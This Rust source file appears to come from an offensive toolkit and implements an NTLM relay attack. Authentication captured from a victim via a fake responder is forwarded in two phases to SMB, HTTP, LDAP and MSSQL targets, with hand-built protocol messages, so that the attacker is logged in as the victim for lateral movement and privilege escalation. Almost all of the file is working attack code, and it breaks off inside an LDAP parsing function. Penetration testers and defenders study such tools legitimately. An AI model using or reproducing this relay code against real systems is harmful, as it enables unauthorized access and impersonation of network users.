//! NTLM Relay Module
//!
//! Relays captured NTLM authentication to target services
//! for lateral movement and privilege escalation.
//!
//! # How NTLM Relay Works
//!
//! 1. Victim connects to our fake service (responder)
//! 2. Victim sends NTLM NEGOTIATE
//! 3. We forward NEGOTIATE to target → get target's CHALLENGE
//! 4. We send the target's CHALLENGE back to victim
//! 5. Victim computes AUTHENTICATE against target's challenge
//! 6. We forward AUTHENTICATE to target
//! 7. Target authenticates us as victim
//!
//! The relay is split into two phases because the victim needs
//! the target's challenge before it can produce AUTHENTICATE.

use crate::{Protocol, RelayError, RelayTarget, Result};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// NTLM Protocol Constants
// ═══════════════════════════════════════════════════════════

const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    Negotiate = 1,
    Challenge = 2,
    Authenticate = 3,
}

/// Parse NTLM message type from raw bytes
pub fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
    if data.len() < 12 {
        return None;
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return None;
    }
    match u32::from_le_bytes([data[8], data[9], data[10], data[11]]) {
        1 => Some(NtlmMessageType::Negotiate),
        2 => Some(NtlmMessageType::Challenge),
        3 => Some(NtlmMessageType::Authenticate),
        _ => None,
    }
}

// ═══════════════════════════════════════════════════════════
// Relay Configuration
// ═══════════════════════════════════════════════════════════

/// Relay configuration
#[derive(Debug, Clone)]
pub struct RelayConfig {
    pub listen_ip: String,
    pub targets: Vec<RelayTarget>,
    /// Try all targets in round-robin fashion
    pub round_robin: bool,
    /// Remove targets after successful relay
    pub remove_on_success: bool,
    /// Connection timeout in seconds
    pub timeout_secs: u64,
}

impl Default for RelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            targets: Vec::new(),
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Relay Statistics
// ═══════════════════════════════════════════════════════════

/// Relay statistics
#[derive(Debug, Clone, Default)]
pub struct RelayStats {
    pub successful_relays: u32,
    pub failed_relays: u32,
    pub active_connections: u32,
    pub total_attempts: u32,
    pub by_protocol: HashMap<String, u32>,
}

// ═══════════════════════════════════════════════════════════
// Two-Phase Relay State
// ═══════════════════════════════════════════════════════════

/// A pending relay connection that has completed Phase 1 (negotiate)
/// and is waiting for Phase 2 (authenticate).
pub struct PendingRelay {
    /// Unique ID for this relay attempt
    pub relay_id: u64,
    /// Target we connected to
    pub target: RelayTarget,
    /// Async TCP stream to the target (kept alive between phases)
    stream: TcpStream,
    /// The NTLM challenge received from the target
    pub challenge: Vec<u8>,
    /// SMB2 session ID (needed for subsequent session setup)
    smb_session_id: u64,
    /// SMB2 message ID counter
    smb_message_id: u64,
}

/// Result of a successful relay (Phase 2 complete)
pub struct RelayedSession {
    pub target: RelayTarget,
    pub username: String,
    pub domain: String,
    pub stream: TcpStream,
    pub smb_session_id: u64,
}

// ═══════════════════════════════════════════════════════════
// NTLM Relay Handler
// ═══════════════════════════════════════════════════════════

/// NTLM Relay handler — fully async, two-phase architecture
pub struct NtlmRelay {
    config: RelayConfig,
    running: bool,
    stats: RelayStats,
    pending: HashMap<u64, PendingRelay>,
    next_id: AtomicU64,
    /// Target round-robin index
    target_idx: usize,
}

impl NtlmRelay {
    /// Create a new NTLM relay with the given configuration
    pub fn new(config: RelayConfig) -> Self {
        Self {
            config,
            running: false,
            stats: RelayStats::default(),
            pending: HashMap::new(),
            next_id: AtomicU64::new(1),
            target_idx: 0,
        }
    }

    /// Start the relay
    pub async fn start(&mut self) -> Result<()> {
        if self.running {
            return Err(RelayError::Config("Relay already running".to_string()).into());
        }

        if self.config.targets.is_empty() {
            warn!("No relay targets configured");
        }

        info!(
            "NTLM relay ready with {} target(s)",
            self.config.targets.len()
        );

        for target in &self.config.targets {
            info!("  -> {}://{}", target.protocol, target.address);
        }

        self.running = true;
        Ok(())
    }

    /// Stop the relay
    pub async fn stop(&mut self) -> Result<()> {
        if !self.running {
            return Ok(());
        }

        info!(
            "Stopping NTLM relay — dropping {} pending relays",
            self.pending.len()
        );
        self.pending.clear();
        self.running = false;
        info!("NTLM relay stopped");
        Ok(())
    }

    /// Get relay statistics
    pub fn get_stats(&self) -> RelayStats {
        self.stats.clone()
    }

    /// Check if relay is running
    pub fn is_running(&self) -> bool {
        self.running
    }

    /// Get configuration
    pub fn config(&self) -> &RelayConfig {
        &self.config
    }

    /// Add a target
    pub fn add_target(&mut self, target: RelayTarget) {
        self.config.targets.push(target);
    }

    /// Remove a target by address
    pub fn remove_target(&mut self, addr: &SocketAddr) {
        self.config.targets.retain(|t| &t.address != addr);
    }

    /// Pick the next target (round-robin)
    fn next_target(&mut self) -> Option<RelayTarget> {
        if self.config.targets.is_empty() {
            return None;
        }
        let target = self.config.targets[self.target_idx % self.config.targets.len()].clone();
        self.target_idx = self.target_idx.wrapping_add(1);
        Some(target)
    }

    // ─────────────────────────────────────────────────────────
    // Phase 1: Forward NEGOTIATE → get CHALLENGE
    // ─────────────────────────────────────────────────────────

    /// Phase 1 of NTLM relay.
    ///
    /// Connects to the next available target, forwards the victim's
    /// NEGOTIATE message, and returns the target's CHALLENGE.
    ///
    /// The caller (responder) must send this CHALLENGE back to the
    /// victim, then call `relay_authenticate()` with the victim's
    /// AUTHENTICATE response.
    pub async fn relay_negotiate(&mut self, ntlm_negotiate: &[u8]) -> Result<(u64, Vec<u8>)> {
        let target = self
            .next_target()
            .ok_or_else(|| RelayError::Config("No relay targets available".into()))?;

        self.stats.total_attempts += 1;

        debug!(
            "Phase 1: connecting to {}://{}",
            target.protocol, target.address
        );

        let timeout = Duration::from_secs(self.config.timeout_secs);

        match target.protocol {
            Protocol::Smb => {
                let (stream, challenge, session_id, msg_id) = self
                    .smb_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                    .await?;

                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                info!(
                    "Phase 1 complete → relay_id={}, target={}://{}",
                    relay_id, target.protocol, target.address
                );

                self.pending.insert(
                    relay_id,
                    PendingRelay {
                        relay_id,
                        target,
                        stream,
                        challenge: challenge.clone(),
                        smb_session_id: session_id,
                        smb_message_id: msg_id,
                    },
                );

                Ok((relay_id, challenge))
            }
            Protocol::Http | Protocol::Https => {
                let (stream, challenge) = self
                    .http_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                    .await?;

                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                self.pending.insert(
                    relay_id,
                    PendingRelay {
                        relay_id,
                        target,
                        stream,
                        challenge: challenge.clone(),
                        smb_session_id: 0,
                        smb_message_id: 0,
                    },
                );

                Ok((relay_id, challenge))
            }
            Protocol::Ldap | Protocol::Ldaps => {
                let (stream, challenge) = self
                    .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                    .await?;

                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                self.pending.insert(
                    relay_id,
                    PendingRelay {
                        relay_id,
                        target,
                        stream,
                        challenge: challenge.clone(),
                        smb_session_id: 0,
                        smb_message_id: 0,
                    },
                );

                Ok((relay_id, challenge))
            }
            Protocol::Mssql => {
                let (stream, challenge) = self
                    .mssql_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                    .await?;

                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                self.pending.insert(
                    relay_id,
                    PendingRelay {
                        relay_id,
                        target,
                        stream,
                        challenge: challenge.clone(),
                        smb_session_id: 0,
                        smb_message_id: 0,
                    },
                );

                Ok((relay_id, challenge))
            }
        }
    }

    // ─────────────────────────────────────────────────────────
    // Phase 2: Forward AUTHENTICATE → get session
    // ─────────────────────────────────────────────────────────

    /// Phase 2 of NTLM relay.
    ///
    /// Takes the relay_id from Phase 1 and the victim's AUTHENTICATE
    /// message (computed against the target's challenge), forwards it
    /// to the target, and returns the authenticated session.
    pub async fn relay_authenticate(
        &mut self,
        relay_id: u64,
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        let mut pending = self.pending.remove(&relay_id).ok_or_else(|| {
            RelayError::Protocol(format!("No pending relay with id {}", relay_id))
        })?;

        let (username, domain) = parse_ntlm_authenticate_info(ntlm_authenticate)?;

        debug!(
            "Phase 2: authenticating {}\\{} to {}://{}",
            domain, username, pending.target.protocol, pending.target.address
        );

        let result = match pending.target.protocol {
            Protocol::Smb => {
                self.smb_session_setup_auth(
                    &mut pending.stream,
                    ntlm_authenticate,
                    pending.smb_session_id,
                    pending.smb_message_id,
                )
                .await
            }
            Protocol::Http | Protocol::Https => {
                self.http_authenticate(&mut pending.stream, ntlm_authenticate, &pending.target)
                    .await
            }
            Protocol::Ldap | Protocol::Ldaps => {
                self.ldap_authenticate(&mut pending.stream, ntlm_authenticate)
                    .await
            }
            Protocol::Mssql => {
                self.mssql_authenticate(&mut pending.stream, ntlm_authenticate)
                    .await
            }
        };

        match result {
            Ok(()) => {
                info!(
                    "✓ Relay successful: {}\\{} → {}://{}",
                    domain, username, pending.target.protocol, pending.target.address
                );

                self.stats.successful_relays += 1;
                *self
                    .stats
                    .by_protocol
                    .entry(pending.target.protocol.to_string())
                    .or_insert(0) += 1;

                if self.config.remove_on_success {
                    let addr = pending.target.address;
                    self.config.targets.retain(|t| t.address != addr);
                }

                Ok(RelayedSession {
                    target: pending.target,
                    username,
                    domain,
                    stream: pending.stream,
                    smb_session_id: pending.smb_session_id,
                })
            }
            Err(e) => {
                self.stats.failed_relays += 1;
                warn!(
                    "✗ Relay failed: {}\\{} → {}: {}",
                    domain, username, pending.target.address, e
                );
                Err(e)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // SMB Relay — Phase 1
    // ═══════════════════════════════════════════════════════════

    /// Connect to SMB target, do SMB2 negotiate, then session setup
    /// with the victim's NTLM negotiate. Returns (stream, challenge, session_id, msg_id).
    async fn smb_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>, u64, u64)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| {
                RelayError::Connection(format!("SMB connect to {}: {}", target.address, e))
            })?;

        let mut buf = vec![0u8; 65536];
        let mut msg_id: u64 = 0;

        // ── SMB2 NEGOTIATE ──
        let smb_negotiate = build_smb2_negotiate(msg_id);
        msg_id += 1;
        stream
            .write_all(&smb_negotiate)
            .await
            .map_err(|e| RelayError::Network(format!("SMB negotiate write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("SMB negotiate read: {}", e)))?;

        if len < 68 || &buf[4..8] != b"\xfeSMB" {
            return Err(RelayError::Protocol("Invalid SMB2 negotiate response".into()).into());
        }

        debug!("SMB2 negotiate OK with {}", target.address);

        // ── SESSION_SETUP with NTLM NEGOTIATE ──
        let session_setup = build_smb2_session_setup(ntlm_negotiate, 0, msg_id);
        msg_id += 1;
        stream
            .write_all(&session_setup)
            .await
            .map_err(|e| RelayError::Network(format!("Session setup write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("Session setup read: {}", e)))?;

        if len < 68 {
            return Err(RelayError::Protocol("Session setup response too short".into()).into());
        }

        // Check status — STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
        if status != 0xC0000016 {
            return Err(RelayError::Protocol(format!(
                "Expected STATUS_MORE_PROCESSING_REQUIRED, got 0x{:08X}",
                status
            ))
            .into());
        }

        // Extract session ID (8 bytes at offset 44)
        let session_id = u64::from_le_bytes([
            buf[44], buf[45], buf[46], buf[47], buf[48], buf[49], buf[50], buf[51],
        ]);

        // Extract NTLM challenge from security buffer
        let challenge = extract_ntlm_from_smb2(&buf[..len])?;

        debug!(
            "Got NTLM challenge from {}, session_id=0x{:016X}",
            target.address, session_id
        );

        Ok((stream, challenge, session_id, msg_id))
    }

    // ═══════════════════════════════════════════════════════════
    // SMB Relay — Phase 2
    // ═══════════════════════════════════════════════════════════

    async fn smb_session_setup_auth(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
        session_id: u64,
        msg_id: u64,
    ) -> Result<()> {
        let pdu = build_smb2_session_setup(ntlm_authenticate, session_id, msg_id);
        stream
            .write_all(&pdu)
            .await
            .map_err(|e| RelayError::Network(format!("Session auth write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("Session auth read: {}", e)))?;

        if len < 12 {
            return Err(RelayError::Protocol("Auth response too short".into()).into());
        }

        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
        if status == 0 {
            Ok(())
        } else {
            Err(
                RelayError::Authentication(format!("SMB auth failed: NT_STATUS 0x{:08X}", status))
                    .into(),
            )
        }
    }

    // ═══════════════════════════════════════════════════════════
    // HTTP Relay — Phase 1 & 2
    // ═══════════════════════════════════════════════════════════

    async fn http_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("HTTP connect: {}", e)))?;

        let negotiate_b64 = base64_encode(ntlm_negotiate);
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            negotiate_b64
        );

        stream
            .write_all(request.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("HTTP negotiate write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("HTTP negotiate read: {}", e)))?;

        let response_str = String::from_utf8_lossy(&response[..len]);

        // Must be 401 with WWW-Authenticate: NTLM <challenge>
        let challenge_b64 = response_str
            .lines()
            .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
            .and_then(|l| l.splitn(3, ' ').nth(2))
            .ok_or_else(|| RelayError::Protocol("No NTLM challenge in HTTP 401".into()))?;

        let challenge = base64_decode(challenge_b64.trim())
            .ok_or_else(|| RelayError::Protocol("Invalid base64 in HTTP challenge".into()))?;

        if parse_ntlm_type(&challenge) != Some(NtlmMessageType::Challenge) {
            return Err(RelayError::Protocol("HTTP response is not NTLM challenge".into()).into());
        }

        debug!("Got NTLM challenge from HTTP {}", target.address);
        Ok((stream, challenge))
    }

    async fn http_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
        target: &RelayTarget,
    ) -> Result<()> {
        let auth_b64 = base64_encode(ntlm_authenticate);
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            auth_b64
        );

        stream
            .write_all(request.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("HTTP auth write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("HTTP auth read: {}", e)))?;

        let response_str = String::from_utf8_lossy(&response[..len]);

        // Only 200 OK means success — 401 means auth FAILED
        if response_str.starts_with("HTTP/1.1 200") || response_str.starts_with("HTTP/1.0 200") {
            Ok(())
        } else {
            let status_line = response_str.lines().next().unwrap_or("(empty)");
            Err(RelayError::Authentication(format!("HTTP auth failed: {}", status_line)).into())
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LDAP Relay — Phase 1 & 2
    // ═══════════════════════════════════════════════════════════

    async fn ldap_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("LDAP connect: {}", e)))?;

        // LDAP SASL bind with GSS-SPNEGO wrapping NTLM negotiate
        let bind_req = build_ldap_sasl_bind(ntlm_negotiate, 1);
        stream
            .write_all(&bind_req)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP negotiate write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP negotiate read: {}", e)))?;

        if len < 10 {
            return Err(RelayError::Protocol("LDAP response too short".into()).into());
        }

        // Extract NTLM challenge from LDAP bind response (saslBindInProgress)
        let challenge = extract_ntlm_from_ldap_response(&response[..len])?;

        debug!("Got NTLM challenge from LDAP {}", target.address);
        Ok((stream, challenge))
    }

    async fn ldap_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
    ) -> Result<()> {
        let bind_req = build_ldap_sasl_bind(ntlm_authenticate, 2);
        stream
            .write_all(&bind_req)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP auth write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP auth read: {}", e)))?;

        // Parse LDAP bind response — find the resultCode
        let result_code = parse_ldap_bind_result(&response[..len])?;

        if result_code == 0 {
            Ok(())
        } else {
            Err(RelayError::Authentication(format!(
                "LDAP bind failed with result code {}",
                result_code
            ))
            .into())
        }
    }

    // ═══════════════════════════════════════════════════════════
    // MSSQL/TDS Relay — Phase 1 & 2
    // ═══════════════════════════════════════════════════════════

    async fn mssql_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("MSSQL connect: {}", e)))?;

        let mut buf = vec![0u8; 65536];

        // TDS PRELOGIN
        let prelogin = build_tds_prelogin();
        stream
            .write_all(&prelogin)
            .await
            .map_err(|e| RelayError::Network(format!("TDS prelogin write: {}", e)))?;

        let _len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS prelogin read: {}", e)))?;

        debug!("TDS prelogin OK with {}", target.address);

        // TDS LOGIN7 with NTLM negotiate as SSPI
        let login = build_tds_login7_sspi(ntlm_negotiate);
        stream
            .write_all(&login)
            .await
            .map_err(|e| RelayError::Network(format!("TDS login write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS login read: {}", e)))?;

        // Extract NTLM challenge from TDS SSPI token
        let challenge = extract_ntlm_from_tds(&buf[..len])?;

        debug!("Got NTLM challenge from MSSQL {}", target.address);
        Ok((stream, challenge))
    }

    async fn mssql_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
    ) -> Result<()> {
        // TDS SSPI continuation (packet type 0x11)
        let auth_pkt = build_tds_sspi_message(ntlm_authenticate);
        stream
            .write_all(&auth_pkt)
            .await
            .map_err(|e| RelayError::Network(format!("TDS auth write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS auth read: {}", e)))?;

        if len == 0 {
            return Err(RelayError::Authentication("Empty TDS response".into()).into());
        }

        // Check for LOGINACK token (0xAD) anywhere in the response
        // TDS response packet type 0x04 = Response
        if buf[0] == 0x04 {
            // Scan for LOGINACK token
            for &byte in &buf[8..len.saturating_sub(1)] {
                if byte == 0xAD {
                    return Ok(());
                }
            }
            // Check for ERROR token (0xAA) for better diagnostics
            for &byte in &buf[8..len.saturating_sub(1)] {
                if byte == 0xAA {
                    return Err(RelayError::Authentication(
                        "TDS returned ERROR token — auth failed".into(),
                    )
                    .into());
                }
            }
        }

        Err(RelayError::Authentication(format!(
            "MSSQL auth failed — TDS packet type 0x{:02X}",
            buf[0]
        ))
        .into())
    }
}

// ═══════════════════════════════════════════════════════════
// SMB2 PDU Builders
// ═══════════════════════════════════════════════════════════

/// Build correct SMB2 NEGOTIATE request.
///
/// Layout per [MS-SMB2] 2.2.3:
///   NetBIOS(4) + Header(64) + NegotiateBody(36+dialects)
fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
    let mut msg = Vec::with_capacity(128);

    // ── NetBIOS session header (4 bytes) ──
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Length placeholder

    // ── SMB2 header (64 bytes) ──
    msg.extend_from_slice(b"\xfeSMB"); // ProtocolId
    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
    msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Command: NEGOTIATE
    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId (u64)
    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
    msg.extend_from_slice(&0u64.to_le_bytes()); // SessionId (u64)
    msg.extend_from_slice(&[0u8; 16]); // Signature

    // ── NEGOTIATE request body (36 + dialects) ──
    msg.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&3u16.to_le_bytes()); // DialectCount
    msg.extend_from_slice(&1u16.to_le_bytes()); // SecurityMode (signing enabled)
    msg.extend_from_slice(&0u16.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
    msg.extend_from_slice(&[0u8; 16]); // ClientGuid (random not needed for relay)

    // ClientStartTime (8 bytes, 0 = MBZ when DialectCount > 0)
    msg.extend_from_slice(&0u64.to_le_bytes());

    // Dialects
    msg.extend_from_slice(&0x0202u16.to_le_bytes()); // SMB 2.0.2
    msg.extend_from_slice(&0x0210u16.to_le_bytes()); // SMB 2.1
    msg.extend_from_slice(&0x0300u16.to_le_bytes()); // SMB 3.0

    // Patch NetBIOS length
    let len = (msg.len() - 4) as u32;
    msg[1] = ((len >> 16) & 0xFF) as u8;
    msg[2] = ((len >> 8) & 0xFF) as u8;
    msg[3] = (len & 0xFF) as u8;

    msg
}

/// Build correct SMB2 SESSION_SETUP request.
///
/// Layout per [MS-SMB2] 2.2.5:
///   NetBIOS(4) + Header(64) + SessionSetup(24+security_buffer)
fn build_smb2_session_setup(ntlm_data: &[u8], session_id: u64, message_id: u64) -> Vec<u8> {
    let mut msg = Vec::with_capacity(128 + ntlm_data.len());

    // ── NetBIOS session header ──
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // ── SMB2 header (64 bytes) ──
    msg.extend_from_slice(b"\xfeSMB");
    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
    msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Command: SESSION_SETUP
    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId
    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
    msg.extend_from_slice(&session_id.to_le_bytes()); // SessionId (u64!)
    msg.extend_from_slice(&[0u8; 16]); // Signature

    // ── SESSION_SETUP request body ──
    // StructureSize = 25 (fixed, per spec)
    msg.extend_from_slice(&25u16.to_le_bytes());
    // Flags (0 = none)
    msg.push(0x00);
    // SecurityMode (1 = signing enabled)
    msg.push(0x01);
    // Capabilities (0)
    msg.extend_from_slice(&0u32.to_le_bytes());
    // Channel (0)
    msg.extend_from_slice(&0u32.to_le_bytes());

    // SecurityBufferOffset = header(64) + session_setup_body(24) minus the
    // 4-byte netbios prefix that's not counted. Per MS-SMB2, the offset is
    // from the beginning of the SMB2 header.
    // Header(64) + body_fixed_part(24) = 88
    let security_buffer_offset: u16 = 88;
    msg.extend_from_slice(&security_buffer_offset.to_le_bytes());
    // SecurityBufferLength
    msg.extend_from_slice(&(ntlm_data.len() as u16).to_le_bytes());
    // PreviousSessionId (u64)
    msg.extend_from_slice(&0u64.to_le_bytes());

    // Security buffer (NTLM data)
    msg.extend_from_slice(ntlm_data);

    // Patch NetBIOS length
    let len = (msg.len() - 4) as u32;
    msg[1] = ((len >> 16) & 0xFF) as u8;
    msg[2] = ((len >> 8) & 0xFF) as u8;
    msg[3] = (len & 0xFF) as u8;

    msg
}

/// Extract NTLM message from SMB2 SESSION_SETUP response
fn extract_ntlm_from_smb2(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
            // Determine challenge message length from target name + target info fields
            // Minimum challenge is 56 bytes, but can be longer with target info
            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in SMB2 response".into()).into())
}

/// Estimate the end of an NTLM challenge message
fn find_ntlm_challenge_end(ntlm_data: &[u8]) -> usize {
    if ntlm_data.len() < 32 {
        return ntlm_data.len();
    }

    // Check for target info at offset 40..48
    if ntlm_data.len() >= 48 {
        let info_len = u16::from_le_bytes([ntlm_data[40], ntlm_data[41]]) as usize;
        let info_offset =
            u32::from_le_bytes([ntlm_data[44], ntlm_data[45], ntlm_data[46], ntlm_data[47]])
                as usize;

        if info_offset + info_len <= ntlm_data.len() && info_offset + info_len > 0 {
            return info_offset + info_len;
        }
    }

    // Fallback: check target name at offset 12..20
    if ntlm_data.len() >= 20 {
        let name_len = u16::from_le_bytes([ntlm_data[12], ntlm_data[13]]) as usize;
        let name_offset =
            u32::from_le_bytes([ntlm_data[16], ntlm_data[17], ntlm_data[18], ntlm_data[19]])
                as usize;

        if name_offset + name_len <= ntlm_data.len() {
            return name_offset + name_len;
        }
    }

    ntlm_data.len().min(256)
}

// ═══════════════════════════════════════════════════════════
// LDAP PDU Builders (proper BER encoding)
// ═══════════════════════════════════════════════════════════

/// Build LDAP SASL Bind request with GSS-SPNEGO wrapping.
///
/// Uses proper BER definite-length encoding that handles
/// payloads > 127 bytes.
fn build_ldap_sasl_bind(ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
    let mechanism = b"GSS-SPNEGO";

    // Build innermost → outermost
    // Credentials: OCTET STRING
    let cred_tlv = ber_octet_string(ntlm_data);
    // Mechanism: OCTET STRING
    let mech_tlv = ber_octet_string(mechanism);
    // SASL auth choice: context tag [3] SEQUENCE { mechanism, credentials }
    let sasl_inner = [mech_tlv, cred_tlv].concat();
    let sasl_tlv = ber_wrap(0xA3, &sasl_inner);

    // Version: INTEGER 3
    let version_tlv = ber_integer(3);
    // DN: OCTET STRING (empty)
    let dn_tlv = ber_octet_string(b"");

    // BindRequest: APPLICATION 0
    let bind_inner = [version_tlv, dn_tlv, sasl_tlv].concat();
    let bind_tlv = ber_wrap(0x60, &bind_inner);

    // Message ID: INTEGER
    let msgid_tlv = ber_integer(message_id as i64);

    // SEQUENCE (top-level LDAP message)
    let msg_inner = [msgid_tlv, bind_tlv].concat();
    ber_wrap(0x30, &msg_inner)
}

/// Parse LDAP BindResponse to extract result code
fn parse_ldap_bind_result(data: &[u8]) -> Result<u8> {
    // Walk the BER structure to find the resultCode
    // SEQUENCE { INTEGER(msgid), APPLICATION 1 (BindResponse) { ENUMERATED(resultCode), ... } }
    // We scan for the pattern: 0x61 (APPLICATION 1) followed by length, then 0x0A (ENUMERATED)

    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0x61 {
            // APPLICATION 1 = BindResponse
            let (inner_start, _inner_len) = match ber_read_length(data, i + 1) {
                Some(v) => v,
                None => continue,
            };
            // First element should be ENUMERATED (0x0A) = resultCode
            if inner_start < data.len() && data[inner_start] == 0x0A {
                let (val_start, val_len) = match ber_read_length(data, inner_start + 1) {
                    Some(v) => v,
                    None => continue,
                };
                if val_len > 0 && val_start < data.len() {
                    return Ok(data[val_start]);
                }
            }
        }
    }

    Err(RelayError::Protocol("Cannot parse LDAP bind result".into()).into())
}

/// Extract NTLM message from LDAP BindResponse serverSaslCreds
fn extract_ntlm_from_ldap_response(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature in the response
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
